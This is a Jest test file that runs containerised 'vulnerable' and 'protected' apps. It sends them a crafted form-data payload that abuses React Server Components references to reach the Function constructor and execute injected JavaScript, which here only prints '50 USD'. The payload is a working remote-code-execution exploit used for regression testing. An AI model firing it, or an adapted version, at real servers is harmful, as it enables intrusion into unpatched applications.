/**
 * @jest-environment node
 */
import { GenericContainer, StartedTestContainer, Wait } from 'testcontainers';
import FormData from 'form-data';
import Stream from 'node:stream';
import { error } from 'node:console';

const malicousPayload = {
  0: '$1',
  1: {
    status: 'resolved_model',
    reason: 0,
    _response: '$4',
    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
    then: '$2:then',
  },
  2: '$@3',
  3: [],
  4: {
    _prefix: "console.log(7*7+1, 'USD')//",
    _formData: {
      get: '$3:constructor:constructor',
    },
    _chunks: '$2:_response:_chunks',
  },
};

describe('react2shell vulnerability test', () => {
  const IMAGE_NAMES = {
    vulnerable: 'vulnerable-app',
    protected: 'protected-app',
  };
  const PORT = 3000;
  const SERVER_READY_TIMEOUT = 30000;
  const EXPLOIT_TIMEOUT = 1000;

  let container: StartedTestContainer;
  let baseUrl: string;
  let logs: Stream.Readable;
  let logsOutput = '';

  const startServerContainer = async (image_name: string) => {
    container = await new GenericContainer(image_name)
      .withExposedPorts(PORT)
      .withWaitStrategy(
        Wait.forHttp('/', PORT)
          .forStatusCodeMatching((code) => code < 500)
          .withStartupTimeout(SERVER_READY_TIMEOUT),
      )
      .start();

    const host = container.getHost();
    const mappedPort = container.getMappedPort(PORT);
    baseUrl = `http://${host}:${mappedPort}`;

    logs = await container.logs();
    logs.on('data', (chunk: Buffer) => {
      let chunkS = chunk.toString();
      console.debug(chunkS);
      logsOutput += chunkS;
    });
  };

  const makeFormData = () => {
    const fd = new FormData();

    for (const [key, value] of Object.entries(malicousPayload)) {
      fd.append(key, JSON.stringify(value));
    }

    return fd;
  };

  const doFetch = async (
    fd: FormData,
    onSuccess?: (response: Response) => Promise<void>,
    onFail?: (error: Error) => Promise<void>,
  ) => {
    try {
      const response = await fetch(baseUrl, {
        method: 'POST',
        headers: {
          'next-action': 'x',
          ...fd.getHeaders(),
        },
        body: fd.getBuffer() as BodyInit,
        signal: AbortSignal.timeout(EXPLOIT_TIMEOUT),
      });
      if (onSuccess) {
        await onSuccess(response);
      }
    } catch (error: any) {
      if (onFail) {
        await onFail(error);
      } else {
        throw error;
      }
    }
  };

  afterAll(async () => {
    if (container) {
      await container.stop();
    }

    if (logs && !logs.destroyed) {
      logs.destroy();
    }
  });

  it(
    'should execute malicous payload on a vulnerable server',
    async () => {
      // Start vulnerable server
      await startServerContainer(IMAGE_NAMES.vulnerable);

      const fd = makeFormData();

      await doFetch(fd, undefined, async (error: Error) => {
        expect(error.name).toEqual('TimeoutError');
      });

      // Check stdout from container
      expect(logsOutput.includes('50 USD')).toBe(true);
    },
    EXPLOIT_TIMEOUT * 10,
  );

  it(
    'should fail executing malicous payload on a protected server',
    async () => {
      // Start protected server
      await startServerContainer(IMAGE_NAMES.protected);

      const fd = makeFormData();

      await doFetch(
        fd,
        async (response: Response) => {
          console.debug('fetched', response);
          expect(response.status).toEqual(404);
          let msg = await response.text();
          expect(msg.includes('Server action not found')).toBe(true);
        },
        undefined,
      );

      // Check stdout from container
      expect(logsOutput.includes('Failed to find Server Action "x".')).toBe(
        true,
      );
    },
    EXPLOIT_TIMEOUT * 10,
  );
});
